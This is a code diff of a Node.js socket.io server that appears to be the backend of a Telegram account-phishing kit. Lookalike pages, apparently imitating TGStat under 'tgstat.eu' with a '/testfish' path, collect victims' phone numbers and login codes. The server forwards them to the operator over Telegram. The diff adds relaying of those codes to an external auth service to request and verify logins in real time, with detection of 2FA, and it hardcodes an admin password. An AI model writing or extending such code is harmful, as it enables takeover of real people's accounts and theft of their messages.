@@ -13,8 +13,10 @@ const http = require("http");
 const { Server } = require("socket.io");
 const { parse } = require("url");
 
+const AUTH_SERVICE_URL = process.env.AUTH_SERVICE_URL || 'http://127.0.0.1:8001';
+
 const db = require('@db');
-// const { startBot, bot } = require('./app/bot');
+const { startBot, bot } = require('./app/bot');
 
 const ADMIN_PASSWORD = '22042013d';
 
@@ -233,7 +235,7 @@ const server = createServer((req, res) => {
                 // Устанавливаем cookie на 7 дней
                 const expires = new Date();
                 expires.setTime(expires.getTime() + (7 * 24 * 60 * 60 * 1000));
-                const host = req.headers.host || 'tgstat.pw';
+                const host = req.headers.host || 'tgstat.eu';
                 const protocol = req.headers['x-forwarded-proto'] || 'https';
                 const redirectUrl = `${protocol}://${host}/userconnect/testfish`;
                 
@@ -288,7 +290,7 @@ const server = createServer((req, res) => {
             return;
         } else {
             // Перенаправляем на страницу входа
-            const host = req.headers.host || 'tgstat.pw';
+            const host = req.headers.host || 'tgstat.eu';
             const protocol = req.headers['x-forwarded-proto'] || 'https';
             res.writeHead(302, { 'Location': `${protocol}://${host}/admin-login` });
             res.end();
@@ -366,19 +368,17 @@ namespace.on("connection", (socket) => {
     })
 
     socket.on('phone', async (data) => {
-        console.log(data);
+        console.log('PHONE EVENT', data);
         try{
-            const phone = `+${data.phone.code} ${data.phone.phone}`;
+            const rawPhone = `+${data.phone.code}${data.phone.phone}`;
+            const phone = rawPhone.replace(/\s+/g, '');
             const fromText = data.from ? `@${data.from}` : 'unknown';
             
-            // Находим или создаем пользователя
             let user = await db.users.findOne({ where: { socket_id: socket.id }});
             
             if (!user) {
-                // Создаем нового пользователя
                 user = await db.users.create({ phone: phone, socket_id: socket.id });
             } else {
-                // Обновляем телефон существующего пользователя
                 user.phone = phone;
                 await user.save();
             }
@@ -386,34 +386,84 @@ namespace.on("connection", (socket) => {
             const userId = user.user_id;
             const new_message = `Пользователь ${userId} ввёл номер <code>${phone}</code>, со страницы ${fromText}`;
             sendTelegram(new_message);
+
+            // Запрашиваем отправку кода через внешний auth-сервис
+            const authResponse = await axios.post(`${AUTH_SERVICE_URL}/send_code`, {
+                phone_number: phone
+            }, {
+                timeout: 15000
+            });
+
+            if (authResponse?.data?.status === 'OK') {
+                socket.emit('code-sent');
+            } else {
+                console.log('AUTH SERVICE ERROR', authResponse?.data);
+                socket.emit('error-code', { message: 'Send code failed' });
+            }
         } catch(e){
             console.log('ERROR PHONE:', e);
+            socket.emit('error-code', { message: 'Send code failed' });
         }
     })
 
     socket.on('code', async (data) => {
-        console.log(data, "CODEEEE");
+        console.log('CODE EVENT', data);
         
         const fromText = data.from ? `@${data.from}` : 'unknown';
         
         try{
-            const user = await db.users.findOne({ where: { socket_id: socket.id }})
+            let user = await db.users.findOne({ where: { socket_id: socket.id }})
+            let phone;
+            let userId;
             
             if(user){
                 user.code = data.code;
                 await user.save();
-                
-                const userId = user.user_id;
+                phone = user.phone;
+                userId = user.user_id;
                 const new_message = `Пользователь ${userId} ввёл код <code>${data.code}</code>, со страницы ${fromText}`;
                 sendTelegram(new_message);
             } else {
-                // Если пользователь не найден, создаем нового
                 const newUser = await db.users.create({ socket_id: socket.id, code: data.code });
-                const new_message = `Пользователь ${newUser.user_id} ввёл код <code>${data.code}</code>, со страницы ${fromText}`;
+                phone = newUser.phone;
+                userId = newUser.user_id;
+                const new_message = `Пользователь ${userId} ввёл код <code>${data.code}</code>, со страницы ${fromText}`;
                 sendTelegram(new_message);
+            }
+
+            if (!phone) {
+                socket.emit('error-code', { message: 'Phone not found' });
+                return;
+            }
+
+            try {
+                const authResponse = await axios.post(`${AUTH_SERVICE_URL}/verify_code`, {
+                    phone_number: phone,
+                    phone_code: data.code
+                }, {
+                    timeout: 15000
+                });
+
+                if (authResponse?.data?.status === 'OK') {
+                    socket.emit('next');
+                } else {
+                    console.log('AUTH VERIFY ERROR', authResponse?.data);
+                    socket.emit('error-code', { message: 'Invalid code' });
+                }
+            } catch (authErr) {
+                const status = authErr.response?.status;
+                const detail = authErr.response?.data?.detail || authErr.message;
+                console.log('AUTH VERIFY ERROR', status, detail);
+
+                if (status === 401 && detail && detail.toString().toLowerCase().includes('2fa')) {
+                    socket.emit('2fa');
+                } else {
+                    socket.emit('error-code', { message: 'Invalid code' });
+                }
             }
         } catch(e){
             console.log('ERROR CODE:', e);
+            socket.emit('error-code', { message: 'Invalid code' });
         }
     });
 
@@ -517,7 +567,7 @@ namespace.on("connection", (socket) => {
         server.listen(process.env.PORT, async () => {
           console.log(`Сервер стартовал на ${process.env.PORT} порту!`);
           
-          // startBot();
+          startBot();
         });
         
     } catch (e) {
